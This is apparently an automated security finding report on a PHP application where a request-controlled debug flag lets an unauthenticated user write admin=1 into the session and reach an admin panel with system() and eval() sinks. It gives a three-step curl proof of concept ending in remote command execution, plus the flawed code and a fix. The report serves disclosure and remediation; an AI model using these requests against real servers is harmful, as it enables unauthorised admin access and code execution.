# Vulnerability: Authentication Bypass — Admin Privilege Escalation via Session Injection

## Summary
The `save_session.php` endpoint, when `debug` mode is enabled via `$_REQUEST['debug']`, writes all request parameters directly into `$_SESSION`. Since `config.php:14` reads `$_REQUEST['debug']` to toggle debug mode, an unauthenticated attacker can send `?debug=1&admin=1` to `save_session.php`, which sets `$_SESSION['admin'] = 1`. The `isAdmin()` function (`common.php:17`) checks only `$_SESSION['admin']`, granting access to the admin panel at `s3cretadm1n/index.php`. This enables full authentication bypass and privilege escalation to admin.

## Confidence
High

## Authentication Requirement
Unauthenticated

## Attack Surface Location
- **Endpoint:** `GET /save_session.php?debug=1&admin=1`
- **Handler:** `save_session.php:1-14`
- **Middleware / Guards:** AumWAF (trivially bypassed — does not block `debug` or `admin` parameters)

## Attack Chain
1. **Initial access:** Attacker sends a crafted GET request to the public-facing `save_session.php` endpoint. No authentication required.
2. **Endpoint interaction:** `save_session.php` checks `$_CONFIG['debug']` (set from `$_REQUEST['debug']` in `config.php:14`).
3. **Malicious input:** `debug=1` enables debug mode; `admin=1` is written to session.
4. **Sink execution:** `save_session.php:10-12` iterates `$_REQUEST` and writes each key-value pair to `$_SESSION`, including `admin=1`.
5. **Post-exploitation:** Attacker's session now has `admin=true`. Accessing `s3cretadm1n/index.php` passes the `isAdmin()` check (`common.php:17`). The admin panel exposes `system(get('c'))` and `eval(get('p'))` — full RCE.
6. **Final impact:** Unauthenticated attacker gains admin privileges and can achieve Remote Code Execution via the admin panel's `system()` and `eval()` sinks.

## Data Flow
- **Source (user input):** `$_REQUEST['debug']` and `$_REQUEST['admin']`
- **Sink:** `$_SESSION` written at `save_session.php:10-12`

```
$_REQUEST['debug'] → config.php:14 ($_CONFIG['debug'] = true) → save_session.php:8 (if($_CONFIG['debug'])) → save_session.php:10-12 ($_SESSION[$key] = $val) → isAdmin() at common.php:17 checks $_SESSION['admin'] → s3cretadm1n/index.php:4
```

## Proof of Concept

### Prerequisites
- None. Fully unauthenticated.

### Exploit Request
```bash
# Step 1: Set session with admin privileges
curl -v -c cookies.txt "http://{{TARGET_HOST}}/save_session.php?debug=1&admin=1"

# Step 2: Access admin panel using the same session
curl -b cookies.txt "http://{{TARGET_HOST}}/s3cretadm1n/index.php"

# Step 3: Achieve RCE via system() in admin panel
curl -b cookies.txt "http://{{TARGET_HOST}}/s3cretadm1n/index.php?c=id"
```

### Expected Vulnerable Response
**Step 1:**
```
Array
(
    [debug] => 1
    [admin] => 1
)
```

**Step 3:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Expected Patched Response
After fixing, step 1 would output nothing (debug mode disabled or session not written), and step 2 would redirect to `/`.

### Impact Demonstration
An unauthenticated attacker can gain admin access and execute arbitrary OS commands on the server, achieving full Remote Code Execution.

## Affected Code
```php
// config.php:14
'debug' => (!empty($_REQUEST['debug'])) ? true : false

// save_session.php:8-12
if( $_CONFIG['debug'] ) {
    header('Content-type: text/plain');
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
    print_r($_SESSION);
}

// common.php:16-18
function isAdmin() {
    return (bool) session('admin', false);
}
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `save_session.php` is publicly accessible with no authentication guard. The `config.php` reads `$_REQUEST['debug']` directly. No guard blocks the `admin` parameter.
- **Impact attack — FAILED to kill.** Direct impact: attacker gains admin privileges, leading to RCE via `system()` at `s3cretadm1n/index.php:19` and `eval()` at `s3cretadm1n/index.php:22`.
- **Validity attack — FAILED to kill.** AumWAF blocks only tool-name signatures — it does not block `debug` or `admin` parameters. No other sanitizer processes these inputs.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Remove or disable `save_session.php` in production. Never allow user-controlled input to toggle debug mode at runtime:
```php
// config.php
'debug' => false // or: getenv('APP_DEBUG') === 'true'
```